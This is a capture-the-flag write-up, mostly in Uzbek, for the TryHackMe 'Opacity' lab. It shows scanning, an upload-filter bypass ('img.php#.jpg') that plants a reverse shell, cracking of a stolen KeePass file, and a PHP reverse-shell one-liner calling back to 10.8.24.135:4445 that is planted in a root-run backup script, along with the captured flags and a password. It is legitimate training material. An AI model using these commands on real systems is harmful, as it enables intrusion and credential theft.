# Opacity

Room: https://tryhackme.com/room/opacity

## Razvetka

### Port Scanning:
```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.161.1 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.161.1:22
Open 10.10.161.1:80
Open 10.10.161.1:139
Open 10.10.161.1:445
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.161.1
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 01:18 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 01:18
Scanning 10.10.161.1 [2 ports]
Completed Ping Scan at 01:18, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:18
Completed Parallel DNS resolution of 1 host. at 01:18, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:18
Scanning 10.10.161.1 [4 ports]
Discovered open port 22/tcp on 10.10.161.1
Discovered open port 80/tcp on 10.10.161.1
Discovered open port 139/tcp on 10.10.161.1
Discovered open port 445/tcp on 10.10.161.1
Completed Connect Scan at 01:18, 0.22s elapsed (4 total ports)
Initiating Service scan at 01:18
Scanning 4 services on 10.10.161.1
Completed Service scan at 01:18, 11.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.161.1.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 01:18
Completed NSE at 01:18, 0.89s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 01:18
Completed NSE at 01:18, 0.81s elapsed
Nmap scan report for 10.10.161.1
Host is up, received syn-ack (0.21s latency).
Scanned at 2025-06-16 01:18:34 +05 for 14s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 4
445/tcp open  netbios-ssn syn-ack Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.88 seconds
```



Samba(139,445):

```
╭─mete   󰉖 ~
╰─ ❯❯ smbclient -L //10.10.161.1 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-10-161-1 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```



80-portda. routinglar:

```
╭─mete   󰉖 ~
╰─ ❯❯ fish
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
mete@sec ~> gobuster dir -u http://10.10.46.101/ -w /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.46.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.46.101/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.46.101/cloud/]
```

/cloud:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/opacity_1.jpg)

## Web Hacking | Vuln Upload

Zararli fayl yuklashimiz kerak.

Reverse shell tayyorlaymiz. Tayyor bo'lgach 2xil nom bilan saqlaymiz.

1. img.php
2. img.php#.jpg

2-kod nomi bu filterni aylanib o'tishga kerak bo'ladi.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/opacity_2.jpg)

Image Link quyidagicha bo'ladi:

```
10.8.24.135/img.php#.jpg
```

Reverse shell joylangach shell ochiladi, agar reverse shellni qabul qilish uchun NetCatni sozlagan bo'lsak:

```
╭─mete    ~
╰─ ❯❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.46.101 60564
Linux ip-10-10-46-101 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 08:47:26 up 45 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

TTY ochamiz:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



## Privilage Escalation

Tizimda bor foydalanuvchilar:

````
www-data@ip-10-10-46-101:/home$ ls
sysadmin  ubuntu
````

Ko'p CTFlarda fayllar qoldirlayotgan DIRga nazar solamiz.

```
www-data@ip-10-10-46-101:/home/ubuntu$ cd /opt
www-data@ip-10-10-46-101:/opt$ ls
dataset.kdbx
```

Aha...

Buni kompyuterimizga olib o'tib, ma'lumotlar bazasini parolini buzib ichidagi ma'lumotni ko'ramiz.

Serverdan http server ochamiz:

```
0-10-46-101:/opt$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.24.135 - - [18/Jun/2025 08:58:34] "GET /dataset.kdbx HTTP/1.1" 200 -
```

Va uni qabul qilamiz:

```
wget http://10.10.46.101:8000/dataset.kdbx
```

John uchun fayldan hash olish:

```
keepass2john dataset.kdbx > hash.txt
```

Brute force qilish uchun buyruq:

````
john hash.txt -w=/usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
````

Natija:

```
mete@sec ~/T/T/1806-2025 [1]> john hash.txt -w=/usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (dataset)
1g 0:00:00:03 DONE (2025-06-18 14:00) 0.2915g/s 265.8p/s 265.8c/s 265.8C/s chichi..micheal
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Faylni ochamiz:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/opacity_3.jpg)

**sysadmin** userini parolini topdik endi unga o'tamiz:

```
www-data@ip-10-10-46-101:/opt$ su sysadmin
su sysadmin
Password: Cl0udP4ss40p4city#8700

sysadmin@ip-10-10-46-101:/opt$
```

**local.txt**'ni qo'lga kiritish:

```
sysadmin@ip-10-10-46-101:~$ ls
ls
local.txt  scripts
sysadmin@ip-10-10-46-101:~$ cat local.txt
cat local.txt
6661b61b44d234d230d06bf5b3c075e2
```

### Root uchun PrvEsc boshlaymiz. sysadmin foydalanuvchisiga tegishli papkada scripts papkasi bor ekan tekshiramiz:

```
sysadmin@ip-10-10-46-101:~$ ls
ls
local.txt  scripts
sysadmin@ip-10-10-46-101:~$ cd scripts
cd scripts
sysadmin@ip-10-10-46-101:~/scripts$ ls
ls
lib  script.php
sysadmin@ip-10-10-46-101:~/scripts$ cat script.php
cat script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>

```

AutoBackUp system ekan.

Ushbu kod "lib/backup.inc.php"ga murojat qilmoqda biz uni o'zgartirib reverse shell joylaymiz.

```
sysadmin@ip-10-10-46-101:~/scripts/lib$ rm backup.inc.php
rm backup.inc.php
rm: remove write-protected regular file 'backup.inc.php'? yes
yes
```



```
echo '<?php $s=fsockopen("10.8.24.135",4445);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' >> backup.inc.php
```



Natija:

```
mete@sec ~/T/T/1806-2025> nc -nvln 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.46.101 36176
/bin/sh: 0: can't access tty; job control turned off
#
```

proof.txt'ni qo'lga kiritish:

```
# cd /root
# ls
proof.txt
snap
# cat proof.txt
ac0d56f93202dd57dcb2498c739fd20e

```

